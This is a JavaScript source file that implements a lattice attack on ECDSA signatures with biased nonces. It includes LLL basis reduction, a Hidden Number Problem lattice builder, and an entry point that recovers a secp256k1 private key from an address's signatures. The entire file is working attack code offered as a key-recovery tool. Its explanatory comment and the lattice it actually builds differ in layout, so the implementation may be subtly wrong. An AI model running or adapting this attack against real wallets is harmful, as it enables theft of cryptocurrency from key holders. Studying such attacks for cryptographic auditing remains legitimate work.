// Lattice attack on biased ECDSA nonces (Hidden Number Problem).
//
// If an address's transactions use k values with their top B bits = 0 (k < n / 2^B),
// the private key can be recovered via LLL lattice basis reduction.
//
// Required: at least ceil(256/B) signatures.  Typical thresholds:
//   B ≥ 128 bits bias → 2 signatures enough
//   B ≥ 64 bits bias  → 4 signatures
//   B ≥ 8 bits bias   → ~32+ signatures (impractical in-browser)
//
// Input: array of { hash: BigInt, r: BigInt, s: BigInt }
// This module implements LLL over BigInt rationals for small matrices.

import { SECP256K1_N, modInv, bigIntToBytes32, verifyPrivKey } from './ecdsa-nonce.js';

// ── Rational arithmetic ──────────────────────────────────────────────────────

function gcd(a, b) {
  a = a < 0n ? -a : a;
  b = b < 0n ? -b : b;
  while (b) { [a, b] = [b, a % b]; }
  return a;
}

class Q {
  constructor(n, d = 1n) {
    if (typeof n === 'number') n = BigInt(n);
    if (typeof d === 'number') d = BigInt(d);
    if (d < 0n) { n = -n; d = -d; }
    if (d === 0n) throw new Error('Division by zero');
    const g = gcd(n < 0n ? -n : n, d);
    this.n = n / g;
    this.d = d / g;
  }
  add(f) { return new Q(this.n * f.d + f.n * this.d, this.d * f.d); }
  sub(f) { return new Q(this.n * f.d - f.n * this.d, this.d * f.d); }
  mul(f) { return new Q(this.n * f.n, this.d * f.d); }
  div(f) { return new Q(this.n * f.d, this.d * f.n); }
  neg()  { return new Q(-this.n, this.d); }
  round() { // round to nearest integer
    const q = this.n / this.d;
    const r = this.n % this.d;
    const half = this.d / 2n;
    if (r < 0n) return r <= -half ? q - 1n : q;
    return r >= half ? q + 1n : q;
  }
  leq(f) { return this.n * f.d <= f.n * this.d; } // this ≤ f
  static from(n) { return new Q(BigInt(n)); }
  static ZERO = new Q(0n);
  static ONE  = new Q(1n);
}

// ── Vector helpers ────────────────────────────────────────────────────────────

function dot(a, b) { return a.reduce((s, v, i) => s.add(v.mul(b[i])), Q.ZERO); }
function norm2(v)  { return dot(v, v); }
function vadd(a, b) { return a.map((v, i) => v.add(b[i])); }
function vsub(a, b) { return a.map((v, i) => v.sub(b[i])); }
function vscale(a, c) { return a.map(v => v.mul(c)); }

// ── Gram-Schmidt ──────────────────────────────────────────────────────────────

function gramSchmidt(B) {
  const m = B.length;
  const Bstar = B.map(row => [...row]);
  const mu    = Array.from({ length: m }, () => Array(m).fill(Q.ZERO));
  for (let i = 0; i < m; i++) {
    for (let j = 0; j < i; j++) {
      mu[i][j] = dot(B[i], Bstar[j]).div(norm2(Bstar[j]));
      Bstar[i] = vsub(Bstar[i], vscale(Bstar[j], mu[i][j]));
    }
  }
  return { Bstar, mu };
}

// ── LLL algorithm ─────────────────────────────────────────────────────────────

export function lll(basisInts, delta = new Q(3n, 4n)) {
  const m = basisInts.length;
  const n = basisInts[0].length;
  // Convert integer basis to Q
  let B = basisInts.map(row => row.map(x => new Q(x)));

  let k = 1;
  const MAX_ITER = m * m * 100;
  let iter = 0;

  while (k < m && iter++ < MAX_ITER) {
    const { Bstar, mu } = gramSchmidt(B);

    // Size reduction
    for (let j = k - 1; j >= 0; j--) {
      const muk = mu[k][j];
      const rounded = muk.round();
      if (rounded !== 0n) {
        B[k] = vsub(B[k], vscale(B[j], new Q(rounded)));
      }
    }

    // Re-compute after size reduction
    const gs2 = gramSchmidt(B);
    const norm_k   = norm2(gs2.Bstar[k]);
    const norm_km1 = norm2(gs2.Bstar[k - 1]);
    const mu_k     = gs2.mu[k][k - 1];

    // Lovász condition
    const lhs = delta.mul(norm_km1);
    const rhs = norm_k.add(mu_k.mul(mu_k).mul(norm_km1));
    if (lhs.leq(rhs)) {
      k++;
    } else {
      // Swap B[k] and B[k-1]
      [B[k], B[k - 1]] = [B[k - 1], B[k]];
      k = Math.max(1, k - 1);
    }
  }

  // Return as BigInt rows
  return B.map(row => row.map(v => v.n / v.d));
}

// ── Build the HNP lattice ─────────────────────────────────────────────────────
//
// For m signatures with B-bit MSB bias (k_i < n / 2^B):
//   t_i = r_i * s_i^{-1} mod n
//   u_i = -h_i * s_i^{-1} mod n
//
// Lattice basis (m+2 rows, m+2 cols):
//   row 0:    [ n,  0,  0, ...,  0,  0 ]
//   row 1..m: [ 0, ..., n, ...,  0,  0 ]   (n on the diagonal column i+1)
//   row m+1:  [ t_1, t_2, ..., t_m,  1, 0 ]
//   ← the target vector contains [k_1−, k_2−, ..., k_m−, d, 0] scaled by B=2^{256-b}
//
// Simplified version: we search the reduced basis for a short vector where
// the last coordinate is ±1 (the private key coefficient).

export function buildHNPLattice(sigs, biasBits) {
  const n = SECP256K1_N;
  const B = (1n << BigInt(256 - biasBits)); // scaling factor

  const m = sigs.length;
  const dim = m + 2;
  const basis = Array.from({ length: dim }, () => Array(dim).fill(0n));

  // First m rows: n on diagonal (columns 0..m-1)
  for (let i = 0; i < m; i++) basis[i][i] = n;

  // Row m: t_i values (column i), then 1, 0
  const ts = [], us = [];
  for (const { hash, r, s } of sigs) {
    const sInv = modInv(s, n);
    ts.push((r * sInv) % n);
    us.push((n - (hash * sInv) % n) % n);
  }
  for (let i = 0; i < m; i++) basis[m][i] = ts[i];
  basis[m][m] = 1n;
  basis[m][m + 1] = 0n;

  // Row m+1: u_i values, then 0, n/B (so private key appears as integer)
  for (let i = 0; i < m; i++) basis[m + 1][i] = us[i];
  basis[m + 1][m] = 0n;
  basis[m + 1][m + 1] = n / B;

  return { basis, B, ts, us };
}

// ── Main entry point ──────────────────────────────────────────────────────────

export function latticeAttack(sigs, address, biasBits = null) {
  const n = SECP256K1_N;

  if (sigs.length < 2) return { error: 'Need at least 2 signatures.' };

  // Auto-detect bias if not specified: try B = 128, 96, 64, 32
  const biasesToTry = biasBits ? [biasBits] : [128, 96, 64, 48, 32];

  for (const B of biasesToTry) {
    const needed = Math.ceil(256 / B) + 1;
    if (sigs.length < needed) continue;

    const subset = sigs.slice(0, Math.min(needed + 2, sigs.length));
    const { basis } = buildHNPLattice(subset, B);

    let reduced;
    try {
      reduced = lll(basis);
    } catch {
      continue;
    }

    // Search each row of the reduced basis for a private key candidate
    const lastCol = basis[0].length - 1;
    for (const row of reduced) {
      const dCandidate = ((row[subset.length] % n) + n) % n;
      if (dCandidate === 0n || dCandidate >= n) continue;

      const verified = verifyPrivKey(dCandidate, address);
      if (verified) {
        return {
          privKey: dCandidate,
          privKeyBytes: bigIntToBytes32(dCandidate),
          biasBits: B,
          sigsUsed: subset.length,
          address: verified,
        };
      }
      // Also try negation
      const dNeg = n - dCandidate;
      const vn = verifyPrivKey(dNeg, address);
      if (vn) {
        return {
          privKey: dNeg,
          privKeyBytes: bigIntToBytes32(dNeg),
          biasBits: B,
          sigsUsed: subset.length,
          address: vn,
        };
      }
    }
  }

  return { error: 'No key found. Try more signatures or a different bias estimate.' };
}
